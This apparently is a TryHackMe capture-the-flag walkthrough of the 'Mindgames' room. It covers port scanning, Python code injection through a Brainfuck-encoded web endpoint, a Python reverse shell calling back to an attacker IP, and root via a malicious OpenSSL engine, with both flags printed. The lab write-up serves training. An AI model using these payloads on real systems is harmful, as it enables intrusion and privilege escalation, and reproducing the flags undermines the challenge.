----
Just a terrible idea...
----

![](https://i.imgur.com/xgHwRVs.png)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/3cc31ae64a4d42a6b5b4ab0e011859b7.png)

###  Capture the flags

 Start Machine

No hints. Hack it. Don't give up if you get stuck, enumerate harder

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.109.15 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.109.15:22
Open 10.10.109.15:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-11 19:56 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:56
Completed Parallel DNS resolution of 1 host. at 19:56, 0.01s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:56
Scanning 10.10.109.15 [2 ports]
Discovered open port 22/tcp on 10.10.109.15
Discovered open port 80/tcp on 10.10.109.15
Completed Connect Scan at 19:56, 0.21s elapsed (2 total ports)
Initiating Service scan at 19:56
Scanning 2 services on 10.10.109.15
Completed Service scan at 19:56, 12.86s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.109.15.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:56
Completed NSE at 19:56, 6.14s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.80s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
Nmap scan report for 10.10.109.15
Host is up, received user-set (0.20s latency).
Scanned at 2023-04-11 19:56:11 EDT for 21s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 244f06260ed37cb8184240127a9e3b71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDffdMrJJJtZTQTz8P+ODWiDoe6uUYjfttKprNAGR1YLO6Y25sJ5JCAFeSfDlFzHGJXy5mMfV5fWIsdSxvlDOjtA4p+P/6Z2KoYuPoZkfhOBrSUZklOig4gF7LIakTFyni4YHlDddq0aFCgHSzmkvR7EYVl9qfxnxR0S79Q9fYh6NJUbZOwK1rEuHIAODlgZmuzcQH8sAAi1jbws4u2NtmLkp6mkacWedmkEBuh4YgcyQuh6jO+Qqu9bEpOWJnn+GTS3SRvGsTji+pPLGnmfcbIJioOG6Ia2NvO5H4cuSFLf4f10UhAC+hHy2AXNAxQxFCyHF0WVSKp42ekShpmDRpP
|   256 5c2b3c56fd602ff728344755d6f88dc1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNlJ1UQ0sZIFC3mf3DFBX0chZnabcufpCZ9sDb7q2zgiHsug61/aTEdedgB/tpQpLSdZi9asnzQB4k/vY37HsDo=
|   256 da168b14aa580ee174856fafbf6b8d58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrqeEIugx9liy4cT7tDMBE59C9PRlEs2KOizMlpDM8h
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Mindgames.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.01s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds

https://www.dcode.fr/brainfuck-language
+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.
print("Hello, World")

--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.
def F(n):
    if n <= 1:
        return 1
    return F(n-1)+F(n-2)


for i in range(10):
    print(F(i))

intercepting with burp

Request:

POST /api/bf HTTP/1.1

Host: 10.10.109.15

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/plain

Origin: http://10.10.109.15

Content-Length: 947

Connection: close



--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.

Response:

HTTP/1.1 200 OK

Date: Wed, 12 Apr 2023 00:01:37 GMT

Content-Length: 24

Content-Type: text/plain; charset=utf-8

Connection: close



1
1
2
3
5
8
13
21
34
55

so let's get a revshell

  File "<string>", line 1
    L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMTkuMTAzLzEzMzggMD4mMQ==
                                                                   ^
SyntaxError: invalid syntax 

we get error in %,==,/

https://highon.coffee/blog/reverse-shell-cheat-sheet/

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

https://www.splitbrain.org/_static/ook/


Request:
POST /api/bf HTTP/1.1

Host: 10.10.109.15

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/plain

Origin: http://10.10.109.15

Content-Length: 4406

Connection: close



+++++ +++++ [->++ +++++ +++<] >++++ +++++ +++.+ +++++ +++.- ----. <+++[

->--- <]>-- -.+++ ++++. -.<++ +++++ +[->- ----- --<]> ----- ----- ----.

<+++[ ->+++ <]>++ ++.<+ +++++ +[->+ +++++ +<]>+ ++++. <++++ ++++[ ->---

----- <]>-- -.+++ ++++. <++++ ++++[ ->+++ +++++ <]>++ .++++ .+++. -.+++

.++.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++

.---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.< +++[- >+++< ]>+++ +++.<

+++++ +++[- >---- ----< ]>--- ----- .<+++ +++++ [->++ +++++ +<]>+ +++++

+.++. <++++ [->-- --<]> ---.< +++[- >+++< ]>+++ ++.++ .---. <+++[ ->---

<]>-- -.++. <+++[ ->+++ <]>++ +++.. <++++ ++++[ ->--- ----- <]>-- -----

.<+++ +++++ [->++ +++++ +<]>+ ++.++ ++.<+ +++++ +[->- ----- -<]>- -----

-.<++ +++++ [->++ +++++ <]>++ +++++ .<+++ ++++[ ->--- ----< ]>--- --.<+

+++++ +[->+ +++++ +<]>+ ++++. ----. <+++[ ->--- <]>-- -.+++ +++++ .----

--.<+ ++[-> +++<] >++++ ++.<+ +++++ ++[-> ----- ---<] >---- --.<+ +++++

++[-> +++++ +++<] >++++ +.--- -.<++ +[->- --<]> ---.+ +++++ ++.-- ----.

<+++[ ->+++ <]>++ ++++. <++++ ++++[ ->--- ----- <]>-- ----- ----- .<+++

+++++ [->++ +++++ +<]>+ +++++ +++++ .---- .<+++ [->-- -<]>- --.++ +++++

+.--- ---.< +++[- >+++< ]>+++ +++.< +++++ +++[- >---- ----< ]>--- ---.<

++++[ ->+++ +<]>+ ++.++ +++.< +++++ [->++ +++<] >.<++ ++[-> ----< ]>---

---.+ ++++. ----- ----. <+++[ ->+++ <]>++ ++++. <++++ ++[-> ----- -<]>-

---.< +++++ +++[- >++++ ++++< ]>+++ ++++. ----. <+++[ ->--- <]>-- -.+++

+++++ .---- --.<+ ++[-> +++<] >++++ ++.<+ +++++ ++[-> ----- ---<] >----

--.<+ +++++ [->++ ++++< ]>+.- ---.< +++[- >---< ]>--- .++++ ++++. <++++

[->++ ++<]> ++++. <+++[ ->--- <]>-- -.+.- -.<++ +[->- --<]> ----. ----.

<+++[ ->+++ <]>++ +.<++ ++++[ ->--- ---<] >.<++ ++[-> ++++< ]>++. <++++

+++[- >++++ +++<] >++++ +++.< +++++ +++[- >---- ----< ]>--- --.<+ +++++

+[->+ +++++ +<]>+ +++.< +++[- >+++< ]>+++ .-..- ----- ---.- -.<++ ++[->

++++< ]>+.< +++++ +++[- >---- ----< ]>--- ----- ----. .---- --.<+ ++[->

+++<] >++++ ++.-. --.<+ ++[-> +++<] >+.<+ ++[-> ---<] >-.++ +.+++ +++++

.<+++ [->-- -<]>- -.+++ .-.++ +.<++ ++[-> ----< ]>-.< +++[- >+++< ]>+.+

++++. ++..+ ++++. <+++[ ->--- <]>-- ----. .<+++ +[->+ +++<] >++.< +++++

++[-> +++++ ++<]> +++.+ +++.< +++++ +++[- >---- ----< ]>--- --.<+ +++++

+[->+ +++++ +<]>+ ++++. <++++ [->++ ++<]> +.--- --.<+ +++++ +[->- -----

-<]>- ----- ----- --.<+ ++[-> ---<] >-.<+ +++++ ++[-> +++++ +++<] >++++

+++++ ++.<+ +++++ ++[-> ----- ---<] >---- -.<++ +++++ [->++ +++++ <]>++

+++++ .+++. +++.- ----- -.+++ +++++ +.+.< +++++ +++[- >---- ----< ]>---

----. +.+++ .++++ .---- ---.< ++++[ ->+++ +<]>+ +.<++ +++[- >---- -<]>-

-.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++ .++++ .<+++ +++++ [->--

----- -<]>- ----. <++++ +++[- >++++ +++<] >++++ +.<++ ++[-> ++++< ]>+.-

----. <++++ +++[- >---- ---<] >---- ----- ----. <+++[ ->--- <]>-. <++++

++++[ ->+++ +++++ <]>++ +++++ ++++. <++++ ++++[ ->--- ----- <]>-- ---.<

+++++ ++[-> +++++ ++<]> +++++ ++.++ +.+++ .---- ---.+ +++++ +++.+ .<+++

+++++ [->-- ----- -<]>- ----- -.+.+ ++.++ +++.- ----- --.<+ +++[- >++++

<]>++ .<+++ ++[-> ----- <]>-- .<+++ +++++ [->++ +++++ +<]>+ +++++ +++++

++++. ++++. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]>

+++++ .<+++ +[->+ +++<] >+.-- ---.< +++++ ++[-> ----- --<]> ----- -----

---.< +++[- >---< ]>-.< +++++ +++[- >++++ ++++< ]>+++ +++++ +++.< +++++

+++[- >---- ----< ]>--- --.<+ +++++ +[->+ +++++ +<]>+ +++++ +.+++ .+++.

----- --.++ +++++ ++.+. <++++ ++++[ ->--- ----- <]>-- ----- .+.++ +.+++

+++.- ----- ---.< ++++[ ->+++ +<]>+ +.<++ +++++ [->++ +++++ <]>++ ++.<+

+++++ +[->- ----- -<]>- -.<++ +++++ [->++ +++++ <]>++ +++.+ +.<++ ++[->

----< ]>--- .<+++ [->++ +<]>+ ++++. ++.-- -.<++ +[->- --<]> ---.+ +.<++

+[->+ ++<]> +++++ ..<++ +++++ +[->- ----- --<]> ----- .<+++ ++++[ ->+++

++++< ]>+++ +.--. <+++[ ->+++ <]>++ ..<++ +++++ +[->- ----- --<]> ----.

<++++ +++[- >++++ +++<] >++.< +++++ ++[-> ----- --<]> ----- ---.< +++[-

>+++< ]>+++ +.<++ +++++ [->++ +++++ <]>++ .++++ +++.+ ++++. <++++ +++[-

>---- ---<] >---- ----- ----- .<+++ ++++[ ->+++ ++++< ]>++. -.<++ ++[->

++++< ]>++. <+++[ ->--- <]>-- .<+++ +++++ [->-- ----- -<]>- ----- .<+++

[->++ +<]>+ .<+++ [->-- -<]>- .<+++ [->++ +<]>+ +.<++ +++++ [->++ +++++

<]>++ +++++ ++++. <++++ ++++[ ->--- ----- <]>-- ----- .<+++ ++++[ ->+++

++++< ]>+++ +++++ ++.<+ +++++ +[->- ----- -<]>- --.<+ +++[- >++++ <]>++

.<+++ +[->- ---<] >---- .<

Response:
HTTP/1.1 200 OK

Date: Wed, 12 Apr 2023 00:25:14 GMT

Content-Length: 522

Content-Type: text/plain; charset=utf-8

Connection: close

  File "<string>", line 1
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ^
SyntaxError: invalid syntax

Testing

https://github.com/se162xg/notes/issues/6


__import__("os").system("whoami")

+++++ ++++[ ->+++ +++++ +<]>+ +++++ +++++ +++.. <+++[ ->+++ <]>+. ++++.
+++.- .+++. ++.<+ +++[- >---- <]>-- ---.. <++++ +++[- >---- ---<] >----
--.-- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ +.+++ +.<++ +++++
++[-> ----- ----< ]>.++ +++++ .++++ +.<++ +++++ +[->+ +++++ ++<]> +++++
.++++ ++.-- ----. +.<++ +[->- --<]> ----- -.+++ +++++ .<+++ +++++ [->--
----- -<]>- ----. ----- -.<++ +++++ ++[-> +++++ ++++< ]>+++ +.<++ +[->-
--<]> ----- -.+++ ++++. <+++[ ->--- <]>-- ---.< +++[- >+++< ]>+++ .----
.<+++ +++++ [->-- ----- -<]>- ----- -.+++ ++++. <

let's see

Request:

POST /api/bf HTTP/1.1

Host: 10.10.109.15

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/plain

Origin: http://10.10.109.15

Content-Length: 560

Connection: close



+++++ ++++[ ->+++ +++++ +<]>+ +++++ +++++ +++.. <+++[ ->+++ <]>+. ++++.

+++.- .+++. ++.<+ +++[- >---- <]>-- ---.. <++++ +++[- >---- ---<] >----

--.-- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ +.+++ +.<++ +++++

++[-> ----- ----< ]>.++ +++++ .++++ +.<++ +++++ +[->+ +++++ ++<]> +++++

.++++ ++.-- ----. +.<++ +[->- --<]> ----- -.+++ +++++ .<+++ +++++ [->--

----- -<]>- ----. ----- -.<++ +++++ ++[-> +++++ ++++< ]>+++ +.<++ +[->-

--<]> ----- -.+++ ++++. <+++[ ->--- <]>-- ---.< +++[- >+++< ]>+++ .----

.<+++ +++++ [->-- ----- -<]>- ----- -.+++ ++++. <

Response:

HTTP/1.1 200 OK

Date: Wed, 12 Apr 2023 00:30:54 GMT

Content-Length: 10

Content-Type: text/plain; charset=utf-8

Connection: close



mindgames

so final payload will be

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);

Request:

POST /api/bf HTTP/1.1

Host: 10.10.109.15

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/plain

Origin: http://10.10.109.15

Content-Length: 560

Connection: close



+++++ +++++ [->++ +++++ +++<] >++++ +.+++ +.+++ .-.++ +.++. <++++ +++++

[->-- ----- --<]> ---.< +++++ ++++[ ->+++ +++++ +<]>+ +.--- -.<++ +[->-

--<]> ---.+ +++++ ++.-- ----. <+++[ ->+++ <]>++ ++++. <++++ ++++[ ->---

----- <]>-- ----- -.<++ +++++ +[->+ +++++ ++<]> +++++ ++.++ .<+++ +[->-

---<] >---. <+++[ ->+++ <]>++ +++.+ +.--- .<+++ [->-- -<]>- --.++ .<+++

[->++ +<]>+ ++++. .<+++ +++++ [->-- ----- -<]>- ----- -.<++ +++++ +[->+

+++++ ++<]> +++.+ +++.< +++++ ++[-> ----- --<]> ----- --.<+ +++++ +[->+

+++++ +<]>+ +++++ +.<++ +++++ [->-- ----- <]>-- ---.< +++++ ++[-> +++++

++<]> +++++ .---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.< +++[- >+++<

]>+++ +++.< +++++ +++[- >---- ----< ]>--- ---.< +++++ +++[- >++++ ++++<

]>+++ ++.-- --.<+ ++[-> ---<] >---. +++++ +++.- ----- .<+++ [->++ +<]>+

+++++ .<+++ +++++ [->-- ----- -<]>- ----- ----- -.<++ +++++ +[->+ +++++

++<]> +++++ +++++ +.--- -.<++ +[->- --<]> ---.+ +++++ ++.-- ----. <+++[

->+++ <]>++ ++++. <++++ ++++[ ->--- ----- <]>-- ----. <++++ [->++ ++<]>

+++.+ ++++. <++++ +[->+ ++++< ]>.<+ +++[- >---- <]>-- ----. +++++ .----

----- .<+++ [->++ +<]>+ +++++ .<+++ +++[- >---- --<]> ----. <++++ ++++[

->+++ +++++ <]>++ +++++ .---- .<+++ [->-- -<]>- --.++ +++++ +.--- ---.<

+++[- >+++< ]>+++ +++.< +++++ +++[- >---- ----< ]>--- ---.< +++++ +[->+

+++++ <]>+. ----. <+++[ ->--- <]>-- -.+++ +++++ .<+++ +[->+ +++<] >++++

.<+++ [->-- -<]>- --.+. --.<+ ++[-> ---<] >---- .---- .<+++ [->++ +<]>+

++.<+ +++++ [->-- ----< ]>.<+ +++[- >++++ <]>++ .<+++ ++++[ ->+++ ++++<

]>+++ ++++. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]>

++++. <+++[ ->+++ <]>++ +.-.. ----- ----. --.<+ +++[- >++++ <]>+. <++++

++++[ ->--- ----- <]>-- ----- ----- ..--- ---.< +++[- >+++< ]>+++ +++.-

.--.< +++[- >+++< ]>+.< +++[- >---< ]>-.+ ++.++ +++++ +.<++ +[->- --<]>

--.++ +.-.+ ++.<+ +++[- >---- <]>-. <+++[ ->+++ <]>+. +++++ .++.. +++++

.<+++ [->-- -<]>- ----- ..<++ ++[-> ++++< ]>++. <++++ +++[- >++++ +++<]

>+++. ++++. <++++ ++++[ ->--- ----- <]>-- ---.< +++++ ++[-> +++++ ++<]>

+++++ .<+++ +[->+ +++<] >+.-- ---.< +++++ ++[-> ----- --<]> ----- -----

---.< +++[- >---< ]>-.< +++++ +++[- >++++ ++++< ]>+++ +++++ +++.< +++++

+++[- >---- ----< ]>--- --.<+ +++++ +[->+ +++++ +<]>+ +++++ +.+++ .+++.

----- --.++ +++++ ++.+. <++++ ++++[ ->--- ----- <]>-- ----- .+.++ +.+++

+.--- ----. <++++ [->++ ++<]> ++.<+ ++++[ ->--- --<]> --.<+ +++++ ++[->

+++++ +++<] >++++ +++++ +++++ +.+++ +.<++ +++++ +[->- ----- --<]> -----

.<+++ ++++[ ->+++ ++++< ]>+++ ++.<+ +++[- >++++ <]>+. ----- .<+++ ++++[

->--- ----< ]>--- ----- ----- .<+++ [->-- -<]>- .<+++ +++++ [->++ +++++

+<]>+ +++++ +++++ .<+++ +++++ [->-- ----- -<]>- ----. <++++ +++[- >++++

+++<] >++++ +++.+ ++.++ +.--- ----. +++++ ++++. +.<++ +++++ +[->- -----

--<]> ----- --.+. +++.+ ++++. ----- ---.< ++++[ ->+++ +<]>+ +.<++ +++[-

>---- -<]>- -.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++ .++++ .<+++

+++++ [->-- ----- -<]>- ----. <++++ +++[- >++++ +++<] >++++ +.<++ ++[->

++++< ]>+.- ----. <++++ +++[- >---- ---<] >---- ----- ----. <+++[ ->---

<]>-. <++++ ++++[ ->+++ +++++ <]>++ +++++ ++++. <++++ ++++[ ->--- -----

<]>-- ---.< +++++ ++[-> +++++ ++<]> +++++ ++.++ +.+++ .---- ---.+ +++++

+++.+ .<+++ +++++ [->-- ----- -<]>- ----- -.+.+ ++.++ ++++. ----- ----.

<++++ [->++ ++<]> ++.<+ +++++ +[->+ +++++ +<]>+ +++.< +++++ ++[-> -----

--<]> --.<+ +++++ +[->+ +++++ +<]>+ ++++. ++.<+ +++[- >---- <]>-- -.<++

+[->+ ++<]> +++++ .++.- --.<+ ++[-> ---<] >---. ++.<+ ++[-> +++<] >++++

+..<+ +++++ ++[-> ----- ---<] >---- -.<++ +++++ [->++ +++++ <]>++ ++.--

.<+++ [->++ +<]>+ +..<+ +++++ ++[-> ----- ---<] >---- .<+++ ++++[ ->+++

++++< ]>++. <++++ +++[- >---- ---<] >---- ----. <+++[ ->+++ <]>++ ++.<+

+++++ +[->+ +++++ +<]>+ +.+++ ++++. +++++ .<+++ ++++[ ->--- ----< ]>---

----- ----- -.<++ +++++ [->++ +++++ <]>++ .-.<+ +++[- >++++ <]>++ .<+++

[->-- -<]>- -.<++ +++++ +[->- ----- --<]> ----- -.<++ +[->+ ++<]> +.<++

+[->- --<]> -.<++ +[->+ ++<]> ++.<+ +++++ +[->+ +++++ +<]>+ +++++ +++++

.<+++ +++++ [->-- ----- -<]>- ----- -.<++ +++++ [->++ +++++ <]>++ +++++

+++.< +++++ ++[-> ----- --<]> ---.< ++++[ ->+++ +<]>+ +.<

┌──(witty㉿kali)-[/tmp]
└─$ rlwrap nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.109.15] 51906
bash: cannot set terminal process group (750): Inappropriate ioctl for device
bash: no job control in this shell
mindgames@mindgames:~/webserver$ whoami
whoami
mindgames
mindgames@mindgames:~/webserver$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ver$ python3 -c 'import pty;pty.spawn("/bin/bash")'

mindgames@mindgames:~/webserver$ cd /home
cd /home
mindgames@mindgames:/home$ ls
ls
mindgames  tryhackme
mindgames@mindgames:/home$ cd mindgames
cd mindgames
mindgames@mindgames:~$ ls
ls
user.txt  webserver
mindgames@mindgames:~$ cat user.txt
cat user.txt
thm{411f7d38247ff441ce4e134b459b6268}

mindgames@mindgames:~/webserver$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep

https://dozer.nz/posts/openssl-arginjection

┌──(witty㉿kali)-[~/Downloads]
└─$ nano engine.c   
                                                              
┌──(witty㉿kali)-[~/Downloads]
└─$ cat engine.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) 
{
 setuid(0);
 setgid(0);
 system("/bin/bash");
 return 0;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()

┌──(witty㉿kali)-[~/Downloads]
└─$ sudo apt-get install libssl-dev

┌──(witty㉿kali)-[~/Downloads]
└─$ gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -lcrypto a.o

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.238.251 - - [12/Apr/2023 12:21:06] "GET /engine.so HTTP/1.1" 200 -

mindgames@mindgames:~/webserver$ cd /tmp
cd /tmp
mindgames@mindgames:/tmp$ wget http://10.8.19.103:1234/engine.so
wget http://10.8.19.103:1234/engine.so
--2023-04-12 16:21:06--  http://10.8.19.103:1234/engine.so
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15712 (15K) [application/octet-stream]
Saving to: ‘engine.so’

engine.so           100%[===================>]  15.34K  45.0KB/s    in 0.3s    

2023-04-12 16:21:07 (45.0 KB/s) - ‘engine.so’ saved [15712/15712]

mindgames@mindgames:/tmp$ chmod +x engine.so
mindgames@mindgames:/tmp$ openssl req -engine ./engine.so
openssl req -engine ./engine.so
root@mindgames:/tmp# cd /root
cd /root
root@mindgames:/root# ls
ls
root.txt
root@mindgames:/root# cat root.txt
cat root.txt
thm{1974a617cc84c5b51411c283544ee254}

```

![[Pasted image 20230411193020.png]]
![[Pasted image 20230411193225.png]]

User flag.

user.txt

*thm{411f7d38247ff441ce4e134b459b6268}*

Root flag.

/root/root.txt

*thm{1974a617cc84c5b51411c283544ee254}*

[[Empline]]